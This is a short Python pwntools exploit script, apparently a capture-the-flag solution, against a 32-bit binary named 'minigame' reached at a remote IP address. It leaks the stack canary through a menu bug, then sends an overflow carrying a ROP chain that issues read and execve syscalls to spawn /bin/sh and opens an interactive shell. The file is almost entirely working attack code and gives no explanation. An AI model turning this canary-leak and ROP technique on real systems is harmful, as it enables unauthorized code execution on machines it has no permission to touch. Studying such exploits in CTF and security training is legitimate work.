from pwn import *

#p = process("./minigame")
#p = remote("localhost",1111)
e  = ELF("./minigame")
p = remote("112.166.114.177",43522)
pr_eax = 0x080b97a6 #pop eax
pr_ebx = 0x8059921 # pop ebx
pr_ecx = 0x080e081d # pop ecx
pr_edx = 0x0807062a
push_ecx = 0x080e4091
syscall = 0x08070C40

main = 0x08049553

mov_count_eax = 0x08048c2d
#raw_input()
#raw_input()
p.sendline("5")

p.sendline("5")


print p.recv()
p.sendline("2")
p.recv()


def syscall_(eax , ebx , ecx ,  edx):
	return p32(pr_eax) + p32(eax) + p32(pr_ebx) + p32(ebx)+ p32(pr_ecx) + p32(ecx)+ p32(pr_edx) + p32(edx) + p32(syscall)

#print hex(e.bss())
payload = p32(pr_eax) + p32(50) + p32(mov_count_eax)+ p32(main) # count = 50 
p.recvuntil(":")
#p.recv()
p.sendline(payload)

p.recvuntil("-> ")
p.sendline("2")
p.recvuntil(":")
p.send("a")
p.recvuntil("-> ")

p.sendline("4")


p.recvuntil("User : a")
canary = u32("\x00"+p.recv(3))
log.info("canary : " + hex(canary))


p.recvuntil("-> ")
p.sendline("1")#game
p.recv()

p.sendline("3")#roulette

while True:
	p.sendline("1")
	#print p.recv()
	if "die?" in p.recv():
		break
	#p.send("1")

payload2  = "A" * 0x14
payload2 += p32(canary)
payload2 += "AAAA"
payload2 += syscall_(3,0,e.bss()+100,0x100) #/bin/sh
#payload2 += syscall_(3,0,e.bss()+50,0x100)
payload2 += syscall_(0x0b,e.bss()+100,0,0)



print hex(len(payload2))
#p.recvuntil("\n")

p.sendline(payload2)
p.recvuntil("~!")
p.sendline("/bin/sh\x00")
'''
#p.sendline(payload2)


'''
p.interactive()
